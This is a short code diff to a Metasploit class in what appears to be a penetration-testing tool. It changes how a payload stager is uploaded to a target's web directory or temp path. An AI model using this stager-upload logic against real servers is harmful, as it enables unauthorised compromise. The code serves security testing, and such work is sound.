@@ -636,15 +636,14 @@ class Metasploit:
 
     def uploadMsfPayloadStager(self, web=False):
         if web:
-            self.exeFilePathRemote = "./%s" % os.path.basename(self.exeFilePathLocal)
+            self.exeFilePathRemote = "%s/%s" % (self.webDirectory, os.path.basename(self.exeFilePathLocal))
         else:
             self.exeFilePathRemote = "%s/%s" % (conf.tmpPath, os.path.basename(self.exeFilePathLocal))
 
         logger.info("uploading payload stager to '%s'" % self.exeFilePathRemote)
 
         if web:
-            for directory in self.webDirectories:
-                self.webFileUpload(self.exeFilePathLocal, self.exeFilePathRemote, directory)
+            self.webFileUpload(self.exeFilePathLocal, self.exeFilePathRemote, self.webDirectory)
         else:
             self.writeFile(self.exeFilePathLocal, self.exeFilePathRemote, "binary", False)
 
